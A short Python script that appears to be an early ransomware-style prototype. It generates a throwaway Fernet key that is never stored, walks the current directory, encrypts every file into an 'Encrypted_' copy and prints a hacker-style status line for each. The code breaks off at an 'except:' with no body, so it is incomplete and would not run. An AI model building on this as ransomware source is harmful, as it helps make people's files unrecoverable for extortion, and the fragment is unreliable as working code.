from cryptography.fernet import Fernet
key = Fernet.generate_key()

import base64
import os
from time import sleep

dir_list = os.listdir()
print (dir_list)
try:
        for i in dir_list:
                with open(i, 'rb') as f:
                        data = f.read()
                fernet = Fernet(key)
                encrypted = fernet.encrypt(data)

                with open("f/Encrypted_{}".format(i), "wb") as f:
                        f.write(encrypted)
                print ("[+] Encrypted file {}".format(i))

                sleep(2)
#this version will only encrypt files not dir so, if theres dir in the path, it will igonore
except:


